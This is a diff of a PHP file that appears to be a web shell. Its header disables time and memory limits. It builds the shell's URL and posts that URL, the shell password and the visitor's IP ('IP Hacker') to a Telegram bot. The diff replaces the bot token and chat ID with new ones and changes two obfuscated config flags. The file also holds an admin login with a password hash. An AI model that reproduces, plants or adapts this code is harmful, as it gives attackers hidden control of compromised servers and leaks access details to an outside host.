@@ -1,17 +1,17 @@
 <?php
 set_time_limit(0);
 ini_set('memory_limit', '-1');
-$botToken = '8527975259:AAGGLXY5coPV4lP0yD045F2vhwn-NWNq7b8';
-$chatId = '8478623770';
+$botToken = '8390423631:AAE18ENcI5InhKoR0RmW3B2Yyke7VoV7Hqc';
+$chatId = '5070938778';
 $xPath = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 $logMessage  = "___APACHE TOP99___ \n\n Shell nya =\n $xPath \n\n Password =\n $password \n\n IP Hacker  :\n [ " . $_SERVER['REMOTE_ADDR'] . " ]";
 sendTelegramMessage($botToken, $chatId, $logMessage);
 $iwQisXQSRKWvV = array(
 	'useMYgqrGg' => 'admin',
 	'paNdjbHrZJBbBlx' => '9f7b0c36272cf9b3608ae0a33b1a4ade',
-	'saHQnUCYTaPEHIU' => '1',
+	'saHQnUCYTaPEHIU' => '0',
 	'lovAbhGzopSyapS' => '403',
-	'shkwIPQOrexuEB' => '1',
+	'shkwIPQOrexuEB' => '0',
 	'poHcrIPZVdbXjORHJ' => false,
 	'cgUVXCQNsBeGHMdA' => true,
 );
